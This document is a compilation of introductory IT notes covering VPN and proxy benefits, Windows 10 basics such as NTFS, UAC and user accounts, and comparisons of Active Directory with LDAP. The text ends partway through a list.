<p>Using a VPN (Virtual Private Network) or a proxy server can offer several benefits, depending on your specific needs and circumstances. Here are some reasons why you might consider using a VPN or proxy:</p>
<ol>
<li>
<p><strong>Privacy and Anonymity</strong>: VPNs and proxies can help mask your IP address, making it more difficult for websites, advertisers, and other entities to track your online activities. This can enhance your online privacy and protect your personal information.</p>
</li>
<li>
<p><strong>Security on Public Networks</strong>: When you connect to public Wi-Fi networks, such as those in coffee shops or airports, your data might be exposed to potential threats. VPNs encrypt your internet connection, ensuring that your data remains secure even on untrusted networks.</p>
</li>
<li>
<p><strong>Bypass Geo-restrictions</strong>: VPNs and proxies can allow you to access websites and online services that might be restricted or blocked in your region. This is particularly useful for accessing content that is only available in certain countries.</p>
</li>
<li>
<p><strong>Access Blocked Content</strong>: If you're in a country where certain websites or services are blocked by the government or local ISPs, using a VPN or proxy can help you access the blocked content.</p>
</li>
<li>
<p><strong>Enhanced Online Security</strong>: VPNs add an extra layer of security by encrypting your internet traffic. This can be especially important when you're transmitting sensitive data, such as financial information or personal messages.</p>
</li>
<li>
<p><strong>Remote Access</strong>: VPNs are commonly used by businesses to provide secure remote access for employees to internal company resources. This is useful for remote work or accessing confidential company data from different locations.</p>
</li>
<li>
<p><strong>Avoid Bandwidth Throttling</strong>: Some ISPs might throttle (slow down) your internet connection when you're streaming videos or engaging in data-intensive activities. Using a VPN can potentially bypass these limitations.</p>
</li>
<li>
<p><strong>Anonymous Downloading</strong>: If you want to download files anonymously, a VPN or proxy can help hide your real IP address from torrent peers and other downloaders.</p>
</li>
<li>
<p><strong>Testing and Development</strong>: Developers and testers often use proxies to simulate connections from different locations or to test how their websites or applications appear in different regions.</p>
</li>
</ol>
<p>It's important to note that while VPNs and proxies offer these advantages, they are not a one-size-fits-all solution. Depending on the service you choose, your internet speed might be affected, and not all VPNs or proxies are equally secure or reliable. Additionally, the legality of using VPNs and proxies can vary depending on your location and how you use them. Always ensure you understand the terms of service and any legal implications before using these tools.</p>

<p>The Windows operating system has a long history dating back to 1985, and currently, it is the dominant operating system in both home use and corporate networks. Because of this, Windows has always been targeted by hackers &amp; malware writers.</p>
<p>Windows XP was a popular version of Windows and had a long-running. Microsoft announced Windows Vista, which was a complete overhaul of the Windows operating system. There were many issues with Windows Vista. It wasn't received well by Windows users, and it was quickly phased out.</p>
<p>When Microsoft announced the end-of-life date for Windows XP, many customers panicked. Corporations, hospitals, etc., scrambled and tested the next viable Windows version, which was Windows 7, against many other hardware and devices. Vendors had to work against the clock to ensure their products worked with Windows 7 for their customers. If they couldn't, their customers had to break their agreement and find another vendor that upgraded their products to work with Windows 7. It was a nightmare for many, and Microsoft took note of it.</p>
<p>Windows 7, as quickly as it was released soon after, was marked with an end of support date. Windows 8.x came and left and it was short-lived, like Vista.</p>
<p>Then arrived Windows 10, which is the current Windows operating system version for desktop computers.</p>
<p>Windows 10 comes in 2 flavors, Home and Pro. You can read the difference between the Home and Pro here. </p>
<p>Even though we didn't talk about servers, the current version of the Windows operating system for servers is Windows Server 2019.</p>
<p>Many critics like to bash on Microsoft, but they have made long strides to improve the usability and security with each new version of Windows. Windows 10 is a very secure operating system, and it is the most secure version of Windows to date.</p>
<p>The Windows Desktop, aka the graphical user interface or GUI in short, is the screen that welcomes you once you log into a Windows 10 machine.</p>
<p>Traditionally, you need to pass the login screen first. The login screen is where you need to enter valid account credentials; usually, a username &amp; password of a preexisting Windows account on that particular system or in the Active Directory environment (if it's a domain-joined machine). </p>
<p>The above screenshot is an example of a typical Windows Desktop. Each component that makes up the GUI is explained briefly below.</p>
<p>The Desktop
Start Menu
Search Box (Cortana)
Task View
Taskbar
Toolbars
Notification Area
The Desktop</p>
<p>The desktop is where you will have shortcuts to programs, folders, files, etc. These icons will either be well organized in folders sorted alphabetically or scattered randomly with no specific organization on the desktop. In either case, these items are typically placed on the desktop for quick access.</p>
<p>The look and feel of the desktop can be changed to suit your liking. By right-clicking anywhere on the desktop, a context menu will appear. This menu will allow you to change the sizes of the desktop icons, specify how you want to arrange them, copy/paste items to the desktop, and create new items, such as a folder, shortcut, or text document.</p>
<p>Under Display settings, you can make changes to the screen's resolution and orientation. In case you have multiple computer screens, you can make configurations to the multi-screen setup here. </p>
<p>Note: In a Remote Desktop session, some of the display settings will be disabled. </p>
<p>You can also change the wallpaper by selecting Personalize.</p>
<p>Under Personalize, you can change the background image to the Desktop, change fonts, themes, color scheme, etc. </p>
<p>The Start Menu</p>
<p>In previous versions of Windows, the word Start was visible at the bottom left corner of the desktop GUI. In modern versions of Windows, such as Windows 10, the word 'Start' doesn't appear anymore, but rather a Windows Logo is shown instead. Even though the look of the Start Menu has changed, its overall purpose is the same. </p>
<p>The Start Menu provides access to all the apps/programs, files, utility tools, etc., that are most useful. </p>
<p>Clicking on the Windows logo, the Start Menu will open. The Start Menu is broken up into sections. See below.</p>
<ol>
<li>This section of the Start Menu provides quick shortcuts to actions that you can perform with your account or login session, such as making changes to your user account, lock your screen, or signing out of your account. Other shortcuts specific to your account are your Documents (document icon) folder and Pictures folder (pictures icon). Lastly, the gear/cog icon will take you to the Settings screen, and the power icon will allow you to Disconnect from a Remote Desktop session, shut down the computer, or restart the computer.</li>
</ol>
<p>In the below image, you can see what each of the icons represents. To expand this section, click on the icon that resembles a hamburger at the top.</p>
<ol start="2">
<li>This section will show all Recently added apps/programs at the top and all the installed apps/programs (that are configured to appear in the Start Menu). In this section, you'll also see the apps/programs will be listed in alphabetical order. Each letter will have its own section. See below.</li>
</ol>
<p>In the above image, the first box is where the recently added apps/programs will appear. The second box is where all the installed apps/programs will appear. </p>
<p>Note: In your VM, Google Chrome will not show up as a Recently Added program anymore.</p>
<p>If you have a LONG list of installed apps/programs, you can jump to a particular section in the list by clicking on the letter headings to launch an alphabet grid. See below.</p>
<p>Note: The white letters match the letter headings. </p>
<ol start="3">
<li>The right side of the Start Menu is where you will find icons for specific apps/programs or utilities. These icons are known as tiles. Some tiles are added to this section by default. If you right-click any of the tiles, you guessed it; a menu will appear to allow you to perform more actions on the selected tile; such as resizing the tile, unpinning from Start Menu, view its Properties, etc. See below.</li>
</ol>
<p>Apps/programs can be added to this Start Menu section by right-clicking the app/program and selecting Pin to Start. See below.</p>
<p>The Taskbar</p>
<p>Some of the components are enabled and visible by default. The Toolbar (6), for example, was enabled for demonstration purposes.</p>
<p>If you're like me and want to disable some of these components, you can right-click on Taskbar to bring up a context menu that will allow you to make changes.</p>
<p>Any apps/programs, folders, files, etc., that you open/start will appear in the taskbar. </p>
<p>Hovering over the icon will provide a preview thumbnail, along with a tooltip. This  tooltip is handy if you have many apps/programs open, such as Google Chrome, and you wish to find which instance of Google Chrome is the one you need to bring in to focus. </p>
<p>When you close any of these items, they will disappear from the taskbar (unless you explicitly pinned it to the taskbar). </p>
<p>The Notification Area</p>
<p>The Notification Area, which is typically located at the bottom right of the Windows screen, is where the date and time are displayed. Other icons possibly visible in this area is the volume icon, network/wireless icon, to name a few. Icons can be either added or removed from the Notification Area in Taskbar settings. </p>
<p>From there, scroll down to the Notification Area section to make changes. </p>
<p>Here are Microsoft's brief documents for the Start Menu and  Notification Area.</p>
<p>Tip: You can right-click any folder, file, app/program, or icon to view more information or perform other actions on the clicked item. </p>
<p>The Search Box (Cortana)</p>
<p>The search box is located at the bottom left of the Windows screen. It is a quick way to search for files, folders, apps/programs, settings, etc.</p>
<p>The search box is powered by Cortana, which is a virtual assistant that can help you find things on your computer, manage your calendar, track packages, find files, chat with you, and tell jokes.</p>
<p>Cortana can be disabled if you don't want to use it.</p>
<p>The Task View</p>
<p>The Task View is a feature that allows you to see all the apps/programs that are currently open. It is a quick way to switch between apps/programs.</p>
<p>The Task View is located at the bottom of the Windows screen, next to the search box.</p>
<p>The Task View can be disabled if you don't want to use it.</p>
<p>The Windows Desktop is the first thing you see when you log into a Windows machine. It is the graphical user interface (GUI) that allows you to interact with the operating system. The Windows Desktop is made up of several components, such as the Start Menu, Taskbar, Notification Area, and the Desktop itself. Each of these components has its own purpose and functionality, and they can be customized to suit your needs.</p>
<p>The Start Menu is the main hub for accessing apps, files, and settings on your Windows machine. It provides quick access to recently used apps, a list of all installed apps, and a collection of tiles that can be customized to display your favorite apps and settings. The Taskbar is a bar that runs along the bottom of the screen and contains shortcuts to open apps, as well as the system tray, which displays the time, date, and various system icons. The Notification Area is located in the bottom right corner of the screen and displays system icons and notifications from apps and services. The Desktop is the area of the screen where you can place shortcuts to files, folders, and apps, as well as your favorite background image.</p>
<p>The Windows Desktop is a central part of the Windows operating system, and understanding its components and functionality is essential for using Windows effectively. By customizing the Start Menu, Taskbar, and Notification Area to suit your needs, you can create a personalized computing experience that makes it easy to access the apps and settings you use most frequently. Whether you're a casual user or a power user, the Windows Desktop provides a flexible and customizable interface that can be tailored to your preferences.</p>

Whether you're a casual user or a power user, the Windows Desktop provides a flexible and customizable interface that can be tailored to your preferences.</p>
<p>The file system used in modern versions of Windows is the New Technology File System or simply NTFS.</p>
<p>Before NTFS, there was FAT16/FAT32 (File Allocation Table) and HPFS (High Performance File System). </p>
<p>You still see FAT partitions in use today. For example, you typically see FAT partitions in USB devices, MicroSD cards, etc. but traditionally not on personal Windows computers/laptops or Windows servers.</p>
<p>NTFS is known as a journaling file system. In case of a failure, the file system can automatically repair the folders/files on disk using information stored in a log file. This function is not possible with FAT.</p>
<p>NTFS addresses many of the limitations of the previous file systems; such as: </p>
<p>Supports files larger than 4GB
Set specific permissions on folders and files
Folder and file compression
Encryption (Encryption File System or EFS)
If you're running Windows, what is the file system your Windows installation is using? You can check the Properties (right-click) of the drive your operating system is installed on, typically the C drive (C:).</p>
<p>You can read Microsoft's official documentation on FAT, HPFS, and NTFS here. </p>
<p>Let's speak briefly on some features that are specific to NTFS. </p>
<p>On NTFS volumes, you can set permissions that grant or deny access to files and folders.</p>
<p>The permissions are:</p>
<p>Full control
Modify
Read &amp; Execute
List folder contents
Read
Write
The below image lists the meaning of each permission on how it applies to a file and a folder. (credit Microsoft)</p>
<p>How can you view the permissions for a file or folder?</p>
<p>Right-click the file or folder you want to check for permissions.
From the context menu, select Properties.
Within Properties, click on the Security tab.
In the Group or user names list, select the user, computer, or group whose permissions you want to view.
In the below image, you can see the permissions for the Users group for the Windows folder. </p>
<p>Refer to the Microsoft documentation to get a better understanding of the NTFS permissions for Special Permissions.</p>
<p>Another feature of NTFS is Alternate Data Streams (ADS).</p>
<p>Alternate Data Streams (ADS) is a file attribute specific to Windows NTFS (New Technology File System).</p>
<p>Every file has at least one data stream ($DATA), and ADS allows files to contain more than one stream of data. Natively Window Explorer doesn't display ADS to the user. There are 3rd party executables that can be used to view this data, but Powershell gives you the ability to view ADS for files.</p>
<p>From a security perspective, malware writers have used ADS to hide data.</p>
<p>Not all its uses are malicious. For example, when you download a file from the Internet, there are identifiers written to ADS to identify that the file was downloaded from the Internet.</p>
<p>To learn more about ADS, refer to the following link from MalwareBytes here. </p>

<p>The Windows folder (C:\Windows) is traditionally known as the folder which contains the Windows operating system. </p>
<p>The folder doesn't have to reside in the C drive necessarily. It can reside in any other drive and technically can reside in a different folder.</p>
<p>This is where environment variables, more specifically system environment variables, come into play. Even though not discussed yet, the system  environment variable for the Windows directory is %windir%.</p>
<p>Per Microsoft, &quot;Environment variables store information about the operating system environment. This information includes details such as the operating system path, the number of processors used by the operating system, and the location of temporary folders&quot;.</p>
<p>There are many folders within the 'Windows' folder. See below.</p>
<p>One of the many folders is System32. </p>
<p>The System32 folder holds the important files that are critical for the operating system.</p>
<p>You should proceed with extreme caution when interacting with this folder. Accidentally deleting any files or folders within System32 can render the Windows OS inoperational. Read more about this action here. </p>
<p>Note: Many of the tools that will be covered in the Windows Fundamentals series reside within the System32 folder. </p>
<p>The Windows folder is a critical part of the Windows operating system. It contains many important files and folders that are essential for the proper functioning of the operating system. The System32 folder, in particular, holds critical system files that should be handled with extreme caution. Understanding the structure and contents of the Windows folder is important for anyone working with Windows systems, as it provides insight into the inner workings of the operating system and the location of important system files.</p>
<p>The Windows Registry is a hierarchical database that stores low-level settings for the Microsoft Windows operating system and for applications that opt to use the registry. The kernel, device drivers, services, Security Accounts Manager, and user interface can all use the registry. The registry also allows access to counters for profiling system performance.</p>
<p>The registry contains two basic elements: keys and values. Keys are containers that can contain values and subkeys. Values contain the actual data. The registry is organized in a tree format, with keys and subkeys representing the various parts of the registry, and values representing the actual data stored in the registry.</p>
<p>The registry is a critical part of the Windows operating system, and it is important to understand how it works and how to interact with it. The registry can be accessed and modified using the Registry Editor, which provides a graphical interface for viewing and editing the registry. It can also be accessed and modified using command-line tools such as regedit and reg.</p>
<p>The registry is a powerful and complex part of the Windows operating system, and it is important to use caution when interacting with it. Making changes to the registry can have a significant impact on the operating system and the applications that use it, so it is important to understand the potential consequences of any changes before making them.</p>
<p>User accounts can be one of two types on a typical local Windows system: Administrator &amp; Standard User. </p>
<p>The user account type will determine what actions the user can perform on that specific Windows system. </p>
<p>An Administrator can make changes to the system: add users, delete users, modify groups, modify settings on the system, etc. 
A Standard User can only make changes to folders/files attributed to the user &amp; can't perform system-level changes, such as install programs.
You are currently logged in as an Administrator. There are several ways to determine which user accounts exist on the system. </p>
<p>One way is to click the Start Menu and type Other User. A shortcut to System Settings &gt; Other users should appear. </p>
<p>If you click on it, a Settings window should now appear. See below.</p>
<p>Since you're the Administrator, you see an option to Add someone else to this PC.</p>
<p>Note: A Standard User will not see this option.</p>
<p>Click on the local user account. More options should appear: Change account type and Remove. </p>
<p>Click on Change account type. The value in the drop-down box (or the highlighted value if you click the drop-down) is the current account type. </p>
<p>When a user account is created, a profile is created for the user. The location for each user profile folder will fall under is C:\Users.</p>
<p>For example, the user profile folder for the user account Max will be C:\Users\Max.</p>
<p>The creation of the user's profile is done upon initial login. When a new user account logs in to a local system for the first time, they'll see several messages on the login screen. One of the messages, User Profile Service, sits on the login screen for a while, which is at work creating the user profile. See below.</p>
<p>Once logged in, the user will see a dialog box similar to the one below (again), indicating that the profile is in creation.</p>
<p>Each user profile will have the same folders; a few of them are:</p>
<p>Desktop
Documents
Downloads
Music
Pictures
Another way to access this information, and then some, is using Local User and Group Management. </p>
<p>Right-click on the Start Menu and click Run. Type lusrmgr.msc. See below</p>
<p>Note: The Run Dialog Box allows us to open items quickly. </p>
<p>Back to lusrmgr, you should see two folders: Users and Groups. </p>
<p>If you click on Groups, you see all the names of the local groups along with a brief description for each group. </p>
<p>Each group has permissions set to it, and users are assigned/added to groups by the Administrator. When a user is assigned to a group, the user inherits the permissions of that group. A user can be assigned to multiple groups.</p>
<p>Note: If you click on Add someone else to this PC from Other users, it will open Local Users and Management. </p>
<p>The large majority of home users are logged into their Windows systems as local administrators. Remember from the previous task that any user with administrator as the account type can make changes to the system.</p>
<p>A user doesn't need to run with high (elevated) privileges on the system to run tasks that don't require such privileges, such as surfing the Internet, working on a Word document, etc. This elevated privilege increases the risk of system compromise because it makes it easier for malware to infect the system. Consequently, since the user account can make changes to the system, the malware would run in the context of the logged-in user.</p>
<p>To protect the local user with such privileges, Microsoft introduced User Account Control (UAC). This concept was first introduced with the short-lived Windows Vista and continued with versions of Windows that followed.</p>
<p>Note: UAC (by default) doesn't apply for the built-in local administrator account. </p>
<p>How does UAC work? When a user with an account type of administrator logs into a system, the current session doesn't run with elevated permissions. When an operation requiring higher-level privileges needs to execute, the user will be prompted to confirm if they permit the operation to run. </p>
<p>Let's look at the program on the account you're currently logged into, the built-in administrator account—Right-click to view its Properties.</p>
<p>In the Security tab, we can see the users/groups and their permissions to this file. Notice that the standard user is not listed. </p>
<p>Log in as the standard user and try to install this program. To do this, you can remote desktop into the machine as the standard user account. </p>
<p>Note: You have the username and password for the standard user. It's visible in lusrmgr.msc.</p>
<p>Before installing the program, notice the icon. Do you see the difference? When you're logged in as the standard user, the shield icon is on the program's default icon. See below.</p>
<p>This shield icon is an indicator that UAC will prompt to allow higher-level privileges to install the program.</p>
<p>Double-click the program, and you'll see the UAC prompt. Notice that the built-in administrator account is already set as the user name and prompts the account's password. See below.</p>
<p>After some time, if a password is not entered, the UAC prompt disappears, and the program does not install. </p>
<p>This feature reduces the likelihood of malware successfully compromising your system. You can read more about UAC here.</p>
<p>The last subject that will be touched on in this module is the Task Manager.</p>
<p>The Task Manager provides information about the applications and processes currently running on the system. Other information is also available, such as how much CPU and RAM are being utilized, which falls under Performance. </p>
<p>You can access the Task Manager by right-clicking the taskbar. </p>
<p>Task Manager will open in Simple View and won't show much information. </p>
<p>Click on More details, and the view changes.</p>
<p>You can refer to this blog post for more detailed information about the Task Manager.</p>

<p>Summary: Struggling to understand the difference between Active Directory and LDAP? Don't worry, we’ll make it simple. These are just two among many methods that can provide secure user authentication and authorization. The information in this article will help you decide if LDAP or Active Directory is right for your organization. Robust security and a seamless user experience are attainable, and you can have both!</p>
<p>What Is LDAP and Active Directory?</p>
<p>Lightweight Directory Access Protocol (LDAP) and Active Directory (AD) are core to Identity and Access Management (IAM). Both are legacy methods that have been in use since the mid-1990s. And both continue to be popular today. While AD and LDAP mean two distinctly different things, some people use these terms interchangeably.</p>
<p>Lightweight Directory Access Protocol (LDAP)</p>
<p>So, what is LDAP? Lightweight Directory Access Protocol is an open, platform-independent protocol used to access and maintain directory services over a TCP/IP network. It’s considered lightweight because LDAP is a pared-down version of an older X.500 network directory services standard called Directory Access Protocol (DAP).</p>
<p>LDAP provides a framework for organizing data within a directory. It also standardizes how users, devices, and clients communicate with a directory server. Because LDAP is optimized for speed, it excels at searching through massive volumes of data quickly. LDAP’s scalability makes it an ideal solution for large enterprises that need to authenticate users on platforms with thousands—or even millions—of users.</p>
<p>Active Directory (AD)</p>
<p>Active Directory (AD) is Microsoft’s proprietary directory service for Windows domain networks. It comprises a database (called a directory) and various services, all of which work together to authenticate and authorize users. The directory contains data that identifies users—for example, their names, phone numbers, and login credentials. It also contains information about devices and other network assets.</p>
<p>AD simplifies IAM by storing information about users, devices, and other resources in a central location. Organizations can enable single sign-on (SSO) to allow users to access multiple resources within a domain using one set of login credentials. AD checks to ensure that users are who they claim to be (authentication) and grants access to resources based on each individual user’s permissions (authorization).</p>
<p>LDAP vs. Active Directory: What's the Difference?</p>
<p>The difference between LDAP and Active Directory is that LDAP is a standard application protocol, while AD is a proprietary product. LDAP is an interface for communicating with directory services, such as AD. In contrast, AD provides a database and services for identity and access management (IAM).
LDAP communicates with directories using a LDAP server. Some organizations use LDAP servers to store identity data for authenticating users to an application. Because AD is also used to store identity data, people sometimes confuse the two methods or conflate them as “LDAP Active Directory” or “Active Directory LDAP.” The fact that AD and LDAP work together adds to the confusion that leads people to think of Active Directory as LDAP.</p>
<p>Similarities Between LDAP and Active Directory</p>
<p>Active Directory is a Microsoft application that stores information about users and devices in a centralized, hierarchical database. AD provides a powerful identity and access management solution. Enterprises use AD to authenticate users to access on-prem resources with a single set of login credentials.</p>
<p>Applications typically use the LDAP protocol to query and communicate with directory services. However, when it’s used in combination with Active Directory, LDAP can also perform authentication. It does this by binding to the database. During binding, the LDAP server authenticates a user and grants access to resources based on that user’s privileges.</p>
<p>While Microsoft uses the more advanced Kerberos protocol as its default authentication method, AD offers organizations the option to implement LDAP instead. LDAP provides a fast and easy method of authentication. It simply verifies the user’s login credentials against the information stored in the AD database. If they match, LDAP grants the user access.</p>
<p>LDAP and Active Directory Advantages and Disadvantages</p>
<p>LDAP and Active Directory have their respective strengths and weaknesses. Evaluating the pros and cons of LDAP vs. Active Directory can help organizations gain a clearer understanding of LDAP vs. AD.</p>
<p>Advantages</p>
<p>These are the main benefits of using LDAP:</p>
<p>It is widely supported across many industries.
It is a standardized, ratified protocol.
It is available as open-source software and has a very flexible architecture.
It is lightweight, fast, and highly scalable.
Active Directory also offers many benefits, including</p>
<p>It is highly customizable, making it easy to use, manage, and control access.
It leverages trust tiers and extensive group policies to provide stronger security than other directory services.
It includes compliance management features, such as data encryption and auditing.
Different versions exist for different needs, including federation services and cloud security.
Disadvantages</p>
<p>As a legacy technology, LDAP has a few downsides. Organizations can find these challenges difficult to overcome:</p>
<p>Its age: LDAP was developed during the early days of the internet.
It is not well-suited for cloud and web-based applications.
Setup and maintenance can be very challenging and usually require an expert.
Active Directory has several drawbacks, too. Here are some disadvantages to consider:</p>
<p>It only runs in Windows environments.
Because AD manages the network, the entire network will go down if AD fails.
Setup and maintenance costs can be high.
Legacy AD is limiting because it requires on-prem infrastructure.
LDAP and Active Directory Use Cases</p>
<p>So, is there a difference between AD and LDAP when it comes to use cases? Yes, indeed.</p>
<p>LDAP was originally developed for Linux and UNIX environments, but today it works with a wide range of applications and operating systems. Examples of popular applications that support LDAP authentication include OpenVPN, Docker, Jenkins, and Kubernetes. One of the most common use cases for LDAP is as a tool for querying, maintaining, and authenticating access to Active Directory.</p>
<p>In contrast, Active Directory is less flexible than LDAP because it only operates in Microsoft environments. AD excels at managing Windows clients and servers and works well with other Microsoft products, such as SharePoint and Exchange. Because AD and domain-joined Windows devices are tightly integrated, Active Directory is more secure than LDAP.</p>
<p>LDAP or Active Directory–Which One Should You Choose?</p>
<p>LDAP’s speed and scalability make it the better option for large applications that need to authenticate vast numbers of users. Examples of organizations that might benefit from LDAP include companies in the airline industry or wireless telecommunications providers that handle millions of subscriber queries.</p>
<p>Microsoft Active Directory is the most widely used directory service for enterprises. It is a good solution for highly structured organizations, such as large commercial banks and government agencies, which prioritize security and compliance. The typical AD customer relies primarily on Windows-based architecture instead of using cloud-, web-, or Linux-based applications.</p>
<p>Because AD was designed for a traditional, on-prem environment with a clearly defined perimeter, there’s no simple way to move it to the cloud. Likewise, because of its age and on-prem limitations, legacy LDAP isn’t a good option for cloud or hybrid environments, either.</p>

<p><a href="https://www.strongdm.com/blog/ldap-vs-active-directory">AD vs LDAP</a></p>
<p>Active Directory is a Microsoft product used to organize IT assets like users, computers, and printers. It integrates with most Microsoft Office and Server products.</p>
<p>Lightweight directory access protocol (LDAP) is a protocol, not a service. LDAP is used to talk to and query several different types of directories (including Active Directory).</p>
<p>What Is Active Directory?
Microsoft creates a lot of IT software, from Windows desktops to Windows Server, Exchange, Sharepoint, and more.</p>
<p>In the IT environment, users don’t want to use a separate password for each application they access. And IT admins want to be able to group people together and manage access to computers and printers.</p>
<p>Active Directory was created to ease the management of users and computers by storing information about them in a single directory.</p>
<p>Imagine working at a company without a directory:</p>
<p>You would have to keep providing a username and password for each application.
IT admins would have to manually assign you to every single application you need to access.
If you update your password or change your last name, you would have to do that in every application in which you have an account.
The directory brings together, in a central service, information about all the people, computers, and other assets in the organization. It also stores credentials (like your username and password) so it can authenticate you to all the applications you use.</p>
<p>In Active Directory, assets are sorted into one of three tiers.</p>
<p>Domains: Users (such as employees) and devices (such as computers) that share the same Active Directory database are part of a domain. A domain is usually associated with either a company or an organization in a company, like the “Engineering Domain.”</p>
<p>Trees: Trees define the trust between domains, deciding who can access what in different parts of an organization, and letting IT admins manage their own community of users and devices.</p>
<p>Forests: For large organizations or intercompany relationships, domains are grouped into forests. Inter-forest trust is usually developed after a company acquires another company. Employees in both organizations need to access each other's resources.
Each one of these levels has access rights and communication privileges unique to it.
Active Directory Tiers Diagram
Active Directory also includes security features, including:</p>
<p>Authentication. Users must provide the relevant credentials before they can access resources on the network.</p>
<p>Security groups. IT admins organize users into groups. The groups are then assigned to apps to minimize administration.</p>
<p>Group policy. There are a large number of policies in Active Directory that define who can access computers remotely or configure browser security settings.
Active Directory supports a variety of ways to authenticate users. Over the range of its life, Active Directory has supported LAN Manager, NTLM, and Kerberos. Each time, the authentication protocol evolved to be more usable and secure.</p>
<p>Active Directory’s main purpose was to bring together all the Microsoft technologies to allow users to easily access resources and to allow administrators to securely define their access.</p>
<p>What Is LDAP?
LDAP is a protocol that was designed for applications to query user information very quickly and at scale. It was ideal for something like the telecommunications or airline industry.</p>
<p>Active Directory was designed for enterprises with maybe a few thousand employees and computers. LDAP was a protocol designed for applications powering the telephone wireless carriers that needed to handle millions of requests to authenticate subscribers to the phone networks.</p>
<p>LDAP is a product-agnostic protocol. Active Directory actually implemented with LDAP support to allow LDAP-based applications to work against an existing Active Directory environment.</p>
<p>As a protocol, LDAP is primarily concerned with:</p>
<p>Directory structure. Each entry in the directory has attributes and can be accessed via a unique distinguished name (DN) that is used when querying the directory.</p>
<p>Adding, updating, and reading data. LDAP is optimized for fast searching and reading of data.</p>
<p>Authentication. In LDAP, you “bind” to the service. This authentication can be a simple username and password, a client certificate, or a Kerberos token.</p>
<p>Search. One area where LDAP excels is search. Again, LDAP-based servers are typically designed for mass queries, and those are usually searches for sets of data.
How Do LDAP &amp; Active Directory Compare?
LDAP is a protocol, but vendors built directories where LDAP was the primary means of communicating with the directory. They were often known as LDAP servers.</p>
<p>The servers were mainly used as an information store about users for an application. As a result, they are sometimes compared with Active Directory. This led to some confusion, with people asking which is better: an LDAP server or Active Directory?</p>
<p>There isn’t really a good answer to this question, as it’s not a fair comparison. People might really be asking a different kind of question. For example, is Active Directory a better choice for an application directory than using Ping Identity Directory or Oracle Internet Directory?</p>
<p>Typically, LDAP servers are appropriate for very large-scale applications, such as the millions of subscriber queries made in a wireless telecommunications platform.</p>
<p>LDAP is also good in situations where you have a large number of user authentications taking place. At one point, Twitter had a very large LDAP service powering its user authentication.</p>
<p>Due to its design, Active Directory is not ideal for very large-scale implementations with a single community of users. It does scale very well when the organization is distributed into multiple forests and domains.</p>
<p>There are Active Directory implementations with hundreds of thousands of users, but they are all managed in localized domains and forests.</p>
<p>Where Active Directory Excels
Active Directory is excellent at its core job, which is managing access to on-premises Microsoft-based technology, such as Windows clients, servers, and SharePoint/Exchange.</p>
<p>Group policy in Active Directory can be very effective at securing Windows computers due to the tight integration between domain-joined Windows computers and Active Directory. LDAP servers have no equivalent here.</p>

What Is Active Directory?
Active Directory (AD) is a directory service that connects users with the network resources they need to accomplish their tasks. It is Microsoft’s proprietary entity that runs on Windows Server and allows administrators to manage access permissions across networks. AD first emerged in the Windows 2000 system, intending to provide directory services to complex IT environments.</p>
<p>The directory stores information about objects, wherein an object may refer to network elements such as a user, group, device, or application. AD is responsible for categorizing these objects based on name and attributes. For instance, the object user may include a user name, designation, access permissions, system password, etc.</p>
<p>The main service offered by Active Directory is Domain Service, also termed as ‘AD DS.’ It is a service that stores directory information and manages user interaction with the domain. When a user signs into a system or attempts to connect to a server on a network, AD DS performs the task of verifying user access. Technically, user access to any network resource is controlled by AD DS. Microsoft products such as Exchange Server and SharePoint Server rely on AD DS to provide access to network resources. The server hosting the AD DS is called a domain controller (DC).</p>
<p>Services offered by AD are used by organizations to control the activities going on within their IT framework. Hence, it is vital for companies to understand the basic structure of AD.</p>
<p>Active Directory structure
Active Directory stores data in a hierarchical structure that consists of domains, trees, and forests.</p>
<p>Domain: A domain refers to a set of objects (users, peripherals, devices) that share a common AD database. It is recognized by a DNS name (xyz_company.com).
Tree: One or more domains combine to form a tree. The tree has a common DNS root name. For instance, ecommerce.marketing.com, sales.marketing.com, and business.marketing.com.
Forest: One or more trees sharing a common schema, directory configuration, or a global catalog are regarded as a forest. However, this does not have a continuous namespace like a tree. Forests act as a security boundary for organizational networks.
Organizational Units (OU): Objects within a domain fall under OUs. These simplify administration and policy management as administrators can create functional, geographic, or business structures and then apply group policies to all these OUs. Moreover, OUs play a crucial role when it comes to the delegation of control over network resources to different administrators.
Other Active Directory services
With time, ADs have evolved, and Microsoft has incorporated an additional suite of services under the Active Directory umbrella.</p>
<ol>
<li>Active Directory Lightweight Directory Services (AD LDS)
The lightweight version of Domain Services eliminates complex and advanced functionalities from directory services by cutting down on the use of domain controllers, forests, or domains. Such services are typically employed in small office setups.</li>
</ol>
<p>For instance, let’s say a company stores all its router information in one directory. In this case, Lightweight Directory Access Protocol (LDAP) can be employed to search for a specific router, localize it on the network, and then connect to it securely. Here, LDAP represents an instance of AD LDS.</p>
<ol start="2">
<li>
<p>Active Directory Certificate Services (AD CS)
AD CS refers to services used to issue and manage digital certificates often seen in software security setups. Such security systems rely on public key technologies. The digital certificates provided by AD CS can be used to encrypt and sign digital documents. These certificates can further be used to authenticate computers, users, or devices on a network.</p>
</li>
<li>
<p>Active Directory Federation Services (AD FS)
AD FS allows individuals to use the single sign-on (SSO) feature to access applications and systems outside the corporate environment. It is much like a web-based feature that contractors can use to log on to a personal network and, at the same time, get authorized to access a client’s private network.</p>
</li>
<li>
<p>Active Directory Rights Management Services (AD RMS)
AD RMS is used as a security strategy by organizations to safeguard and protect documents using information rights management (IRM) policies. AD RMS enables individuals and administrators to define permissions to access documents, workbooks, and presentations.</p>
</li>
</ol>

<p>Importance of Active Directory
Active Directory makes the life of an administrator easy since it provides them with a centralized user and rights management platform. Organizations gain better control over computer and user configurations by implementing AD. Moreover, companies can keep their network and resources secure and organized without the need to deploy excessive IT resources.</p>
<p>Thanks to the benefits AD offers to organizations of all sizes, several companies today are implementing it as a necessity. According to a recent report by 6sense, in 2023, 18,132 companies from across the globe started using Microsoft Azure AD services. If we look at this from a geographical viewpoint, the U.S. is the top contributor with 51.96% of customers, followed by the U.K. with 9.52%, and Canada with 5.59% of customers.</p>
<p>As AD is being deployed at a large scale, it is important to consider why its implementation is inevitable for IT environments.</p>
<p>Active Directory Importance
Active Directory Importance</p>
<ol>
<li>Provides a master data repository
AD is a master repository that stores the identity information of users, applications, and network resources. The AD database can store the information of up to 2 billion objects. Moreover, AD gives flexibility to corporate users who intend to use the organization’s network from any remote location. This means remote users can access network resources from anywhere in the network, irrespective of their physical presence.</li>
</ol>
<p>AD is key to administrators since the authentication and authorization of users and applications can be done from one master repository. Also, without directory services, identity information could be replicated in various systems, which can eventually complicate the task of administrators.</p>
<ol start="2">
<li>
<p>Facilitates minimal data replication
